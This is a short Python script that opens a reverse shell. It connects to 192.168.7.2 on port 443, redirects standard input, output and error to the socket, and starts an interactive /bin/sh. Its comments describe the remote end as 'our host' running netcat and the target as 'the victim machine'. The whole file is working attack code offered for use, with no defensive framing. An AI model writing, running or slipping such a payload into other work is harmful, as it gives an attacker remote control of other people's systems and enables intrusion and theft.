import socket,os,subprocess
#declares the socket properties and connects to our host's socket stream
supersecret = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
supersecret.connect(("192.168.7.2",443))
#copies the descriptor from the socket sream to file descriptors 0,1 and 2
#this basically ensures that the shell is connected to the netcat host and dosent just deploy indepnedently on the victim machine
os.dup2(supersecret.fileno(),0)
os.dup2(supersecret.fileno(),1)
os.dup2(supersecret.fileno(),2)
#opens the bash shell in interactive mode within a subprocess 
p = subprocess.call(["/bin/sh","-i"])
    

